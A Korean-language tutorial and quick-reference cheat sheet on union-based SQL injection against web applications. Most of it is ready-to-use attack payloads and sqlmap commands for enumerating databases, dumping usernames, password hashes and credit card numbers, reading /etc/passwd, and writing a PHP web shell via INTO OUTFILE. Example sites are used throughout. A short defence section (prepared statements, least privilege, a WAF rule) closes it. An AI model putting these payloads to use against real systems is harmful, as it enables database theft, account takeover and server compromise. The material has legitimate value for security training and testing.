Union-based SQL Injection

Union-based SQLi는 UNION SQL 연산자를 사용하여 여러 SELECT 쿼리의 결과를 결합함으로써 데이터베이스에서 데이터를 추출하는 가장 강력한 In-band SQLi 기법입니다.

개념 (Concept)​

Union-based SQLi란?​

Union-based SQL Injection은 UNION 연산자를 이용하여 원본 쿼리에 추가 SELECT 쿼리를 결합해 데이터를 추출하는 기법입니다.

UNION 연산자:

SELECT column1, column2 FROM table1
UNION
SELECT column1, column2 FROM table2

→ 두 쿼리의 결과를 하나로 합침

공격 원리:

-- 원본 쿼리
SELECT name, price FROM products WHERE id=1

-- 공격 쿼리
SELECT name, price FROM products WHERE id=1 UNION SELECT username, password FROM users

→ 상품 정보와 사용자 정보가 함께 출력됨

UNION 사용 조건​

UNION을 사용하려면 두 가지 조건을 충족해야 합니다:

  1. 컬럼 수 일치: 두 SELECT 문의 컬럼 개수가 같아야 함
  2. 데이터 타입 호환: 같은 위치의 컬럼 타입이 호환되어야 함

잘못된 예시 (컬럼 수 불일치):

SELECT name, price FROM products WHERE id=1
UNION
SELECT username FROM users  -- 에러 발생!

올바른 예시:

SELECT name, price FROM products WHERE id=1
UNION
SELECT username, password FROM users  -- 정상 작동

수동 공격 (Manual Exploitation)​

단계 1: 취약점 탐지​

특수문자 삽입:

http://example.com/product?id=1'

에러 확인:

You have an error in your SQL syntax

단계 2: 컬럼 수 확인​

방법 1: ORDER BY 사용​

개념: ORDER BY로 컬럼 번호를 지정하여 컬럼 수를 파악

' ORDER BY 1--   ✓ 정상
' ORDER BY 2--   ✓ 정상
' ORDER BY 3--   ✓ 정상
' ORDER BY 4--   ✗ 에러 발생

→ 컬럼 수는 3개

URL 예시:

http://example.com/product?id=1' ORDER BY 1--
http://example.com/product?id=1' ORDER BY 2--
http://example.com/product?id=1' ORDER BY 3--
http://example.com/product?id=1' ORDER BY 4--  (에러!)

방법 2: UNION SELECT NULL 사용​

개념: NULL을 사용하여 컬럼 수를 맞춤 (타입 제약 없음)

' UNION SELECT NULL--              ✗ 에러
' UNION SELECT NULL, NULL--        ✗ 에러
' UNION SELECT NULL, NULL, NULL--  ✓ 정상

→ 컬럼 수는 3개

단계 3: 출력 위치 확인​

숫자 또는 문자열로 테스트:

' UNION SELECT 1, 2, 3--

웹 페이지 출력 예시:

Product Name: 2
Product Price: 3

→ 2번째와 3번째 컬럼이 화면에 표시됨

단계 4: 데이터베이스 정보 수집​

현재 DB 이름​

MySQL:

' UNION SELECT NULL, database(), NULL--

MSSQL:

' UNION SELECT NULL, DB_NAME(), NULL--

PostgreSQL:

' UNION SELECT NULL, current_database(), NULL--

Oracle:

' UNION SELECT NULL, (SELECT name FROM v$database), NULL FROM dual--

DB 버전​

MySQL:

' UNION SELECT NULL, version(), NULL--

MSSQL:

' UNION SELECT NULL, @@version, NULL--

PostgreSQL:

' UNION SELECT NULL, version(), NULL--

현재 사용자​

MySQL:

' UNION SELECT NULL, user(), NULL--

MSSQL:

' UNION SELECT NULL, USER_NAME(), NULL--

PostgreSQL:

' UNION SELECT NULL, current_user, NULL--

단계 5: 테이블 이름 추출​

MySQL​

단일 테이블:

' UNION SELECT NULL, table_name, NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1--

모든 테이블 (한 번에):

' UNION SELECT NULL, GROUP_CONCAT(table_name), NULL FROM information_schema.tables WHERE table_schema=database()--

출력 예시:

users,products,orders,sessions

MSSQL​

' UNION SELECT NULL, name, NULL FROM sys.tables--

PostgreSQL​

' UNION SELECT NULL, tablename, NULL FROM pg_tables WHERE schemaname='public'--

Oracle​

' UNION SELECT NULL, table_name, NULL FROM all_tables--

단계 6: 컬럼 이름 추출​

MySQL​

단일 컬럼:

' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users' LIMIT 0,1--

모든 컬럼:

' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_name='users'--

출력 예시:

id,username,password,email,created_at

MSSQL​

' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'--

PostgreSQL​

' UNION SELECT NULL, column_name, NULL FROM information_schema.columns WHERE table_name='users'--

단계 7: 데이터 추출​

단일 행 추출​

MySQL:

' UNION SELECT NULL, username, password FROM users LIMIT 0,1--

MSSQL:

' UNION SELECT NULL, TOP 1 username, password FROM users--

PostgreSQL:

' UNION SELECT NULL, username, password FROM users LIMIT 1--

Oracle:

' UNION SELECT NULL, username, password FROM users WHERE rownum=1--

여러 행 순차 추출​

MySQL (LIMIT 활용):

' UNION SELECT NULL, username, password FROM users LIMIT 0,1--  -- 1번째 사용자
' UNION SELECT NULL, username, password FROM users LIMIT 1,1--  -- 2번째 사용자
' UNION SELECT NULL, username, password FROM users LIMIT 2,1--  -- 3번째 사용자

모든 데이터 한 번에 추출​

MySQL (GROUP_CONCAT 사용):

' UNION SELECT NULL, GROUP_CONCAT(username, ':', password), NULL FROM users--

출력 예시:

admin:5f4dcc3b,user1:098f6bcd,guest:084e0343

MSSQL (STRING_AGG 사용 - SQL Server 2017+):

' UNION SELECT NULL, STRING_AGG(CONCAT(username, ':', password), ','), NULL FROM users--

여러 컬럼 결합​

CONCAT 함수 사용:

' UNION SELECT NULL, CONCAT(username, ':', password, ':', email), NULL FROM users--

출력 예시:

admin:password123:admin@example.com

자동화 도구 (Automated Tools)​

SQLMap - Union-based 전용​

기본 Union-based 스캔​

sqlmap -u "http://example.com/product?id=1" --technique=U --batch

옵션 설명:

  • --technique=U: Union-based만 사용
  • --batch: 자동으로 진행

출력 예시:

[INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[INFO] target URL appears to have 3 columns in query
[INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable

데이터베이스 열거​

모든 DB 조회:

sqlmap -u "http://example.com/product?id=1" --technique=U --dbs

출력 예시:

available databases [3]:
[*] information_schema
[*] mysql
[*] webapp

현재 DB 조회:

sqlmap -u "http://example.com/product?id=1" --technique=U --current-db

테이블 열거​

sqlmap -u "http://example.com/product?id=1" --technique=U -D webapp --tables

출력 예시:

Database: webapp
[5 tables]
+-----------+
| users     |
| products  |
| orders    |
| sessions  |
| logs      |
+-----------+

컬럼 열거​

sqlmap -u "http://example.com/product?id=1" --technique=U -D webapp -T users --columns

출력 예시:

Database: webapp
Table: users
[5 columns]
+------------+--------------+
| Column     | Type         |
+------------+--------------+
| id         | int(11)      |
| username   | varchar(50)  |
| password   | varchar(100) |
| email      | varchar(100) |
| created_at | datetime     |
+------------+--------------+

데이터 덤프​

전체 테이블 덤프:

sqlmap -u "http://example.com/product?id=1" --technique=U -D webapp -T users --dump

특정 컬럼만 덤프:

sqlmap -u "http://example.com/product?id=1" --technique=U -D webapp -T users -C username,password --dump

출력 예시:

Database: webapp
Table: users
[10 entries]
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
| 1  | admin    | 5f4dcc3b5aa765d61d8327deb882cf99 |
| 2  | user1    | 098f6bcd4621d373cade4e832627b4f6 |
| 3  | user2    | 482c811da5d5b4bc6d497ffa98491e38 |
+----+----------+----------------------------------+

조건부 덤프​

WHERE 조건 추가:

sqlmap -u "http://example.com/product?id=1" --technique=U -D webapp -T users --dump --where="role='admin'"

자동 해시 크랙​

sqlmap -u "http://example.com/product?id=1" --technique=U -D webapp -T users --dump --passwords

출력 예시:

[INFO] cracking hashes using dictionary-based attack
[INFO] cracked password 'password' for hash '5f4dcc3b5aa765d61d8327deb882cf99'

고급 기법​

1. NULL 타입 에러 우회​

일부 컬럼이 특정 타입을 요구할 때 NULL 대신 적절한 값 사용

문자열 타입 요구:

' UNION SELECT 'a', 'b', 'c'--

숫자 타입 요구:

' UNION SELECT 1, 2, 3--

혼합:

' UNION SELECT 1, 'text', NULL--

2. 여러 데이터베이스에서 추출​

MySQL - 모든 DB의 테이블 조회:

' UNION SELECT NULL, CONCAT(table_schema, '.', table_name), NULL FROM information_schema.tables--

출력 예시:

webapp.users
webapp.products
mysql.user
information_schema.tables

3. 파일 읽기 (MySQL)​

조건: FILE 권한 필요

' UNION SELECT NULL, LOAD_FILE('/etc/passwd'), NULL--

Windows:

' UNION SELECT NULL, LOAD_FILE('C:\\Windows\\System32\\drivers\\etc\\hosts'), NULL--

4. 파일 쓰기 (MySQL)​

조건: FILE 권한 + secure_file_priv 설정

' UNION SELECT NULL, 'malicious code', NULL INTO OUTFILE '/var/www/html/shell.php'--

웹쉘 작성 예시:

' UNION SELECT NULL, '<?php system($_GET["cmd"]); ?>', NULL INTO OUTFILE '/var/www/html/backdoor.php'--

5. 다중 테이블 JOIN​

여러 테이블 동시 추출:

' UNION SELECT NULL, CONCAT(u.username, ':', p.product_name), NULL FROM users u, products p WHERE u.id=p.user_id--

실전 공격 시나리오​

시나리오 1: 전자상거래 사이트​

취약한 URL:

http://shop.example.com/product.php?id=5

1. 컬럼 수 확인:

http://shop.example.com/product.php?id=5' ORDER BY 4--

→ 에러 발생 → 컬럼 3개

2. 출력 위치 확인:

http://shop.example.com/product.php?id=-5' UNION SELECT 1, 2, 3--

→ 화면에 "2", "3" 출력

3. 테이블 이름 추출:

http://shop.example.com/product.php?id=-5' UNION SELECT 1, GROUP_CONCAT(table_name), 3 FROM information_schema.tables WHERE table_schema=database()--

→ users,products,orders,credit_cards

4. 신용카드 정보 추출:

http://shop.example.com/product.php?id=-5' UNION SELECT 1, GROUP_CONCAT(card_number, ':', expiry), 3 FROM credit_cards--

시나리오 2: 뉴스 사이트​

취약한 URL:

http://news.example.com/article.php?id=10

관리자 계정 탈취:

http://news.example.com/article.php?id=-10' UNION SELECT NULL, CONCAT(username, ':', password), email FROM users WHERE role='admin'--

DBMS별 차이점​

DBMS문자열 결합LIMIT 구문주석
MySQLCONCAT()LIMIT 0,1--, #
MSSQL+TOP 1--
PostgreSQL||LIMIT 1 OFFSET 0--
Oracle||WHERE rownum=1--

Oracle 특수 사항​

Oracle은 모든 SELECT에 FROM이 필수:

-- 다른 DBMS
' UNION SELECT NULL, 'test', NULL--

-- Oracle (dual 테이블 사용)
' UNION SELECT NULL, 'test', NULL FROM dual--

방어 기법​

1. Prepared Statements (가장 효과적)​

PHP (PDO):

$stmt = $pdo->prepare("SELECT * FROM products WHERE id = ?");
$stmt->execute([$id]);

Python (MySQLdb):

cursor.execute("SELECT * FROM products WHERE id = %s", (id,))

Java (JDBC):

PreparedStatement stmt = conn.prepareStatement("SELECT * FROM products WHERE id = ?");
stmt.setInt(1, id);

2. 입력 검증 및 화이트리스트​

// 정수만 허용
$id = filter_var($_GET['id'], FILTER_VALIDATE_INT);
if ($id === false) {
    die("Invalid input");
}

// 화이트리스트 방식
$allowed_ids = [1, 2, 3, 4, 5];
if (!in_array($id, $allowed_ids)) {
    die("Invalid input");
}

3. 최소 권한 원칙​

데이터베이스 사용자 권한 제한:

-- 읽기 전용 권한만 부여
GRANT SELECT ON webapp.* TO 'webuser'@'localhost';

-- FILE 권한 제거
REVOKE FILE ON *.* FROM 'webuser'@'localhost';

4. WAF 설정​

ModSecurity 규칙:

SecRule ARGS "@rx union.*select" \
    "id:1002,phase:2,deny,status:403,msg:'Union-based SQLi attempt'"

트러블슈팅 체크리스트​

UNION이 작동하지 않을 때​

  • 컬럼 수가 정확한지 재확인 (ORDER BY 사용)
  • NULL 대신 적절한 타입 사용 (숫자, 문자열)
  • Oracle인 경우 FROM dual 추가
  • 주석 처리가 올바른지 확인 (-- 뒤 공백 필요)

데이터가 화면에 표시되지 않을 때​

  • 원본 쿼리 결과를 무효화 (음수 ID 사용: id=-1)
  • 출력되는 컬럼 위치 재확인
  • 페이지 소스 코드 확인 (HTML 주석에 숨겨진 경우)

에러가 계속 발생할 때​

  • URL 인코딩 필요 여부 (' → %27, → +)
  • 싱글쿼터 대신 더블쿼터 시도
  • DBMS 종류 재확인

빠른 명령어 참조 (Quick Reference)​

MySQL​

# 컬럼 수 확인
' ORDER BY 1--
' UNION SELECT NULL--

# 기본 정보
' UNION SELECT NULL, database(), user()--
' UNION SELECT NULL, version(), @@datadir--

# 테이블/컬럼 조회
' UNION SELECT NULL, GROUP_CONCAT(table_name), NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT NULL, GROUP_CONCAT(column_name), NULL FROM information_schema.columns WHERE table_name='users'--

# 데이터 추출
' UNION SELECT NULL, GROUP_CONCAT(username, ':', password), NULL FROM users--

MSSQL​

# 기본 정보
' UNION SELECT NULL, DB_NAME(), @@version--

# 테이블 조회
' UNION SELECT NULL, name, NULL FROM sys.tables--

# 데이터 추출
' UNION SELECT NULL, TOP 10 username, password FROM users--

PostgreSQL​

# 기본 정보
' UNION SELECT NULL, current_database(), version()--

# 테이블 조회
' UNION SELECT NULL, tablename, NULL FROM pg_tables WHERE schemaname='public'--

Oracle​

# 기본 정보 (dual 필수)
' UNION SELECT NULL, user, NULL FROM dual--

# 테이블 조회
' UNION SELECT NULL, table_name, NULL FROM all_tables--
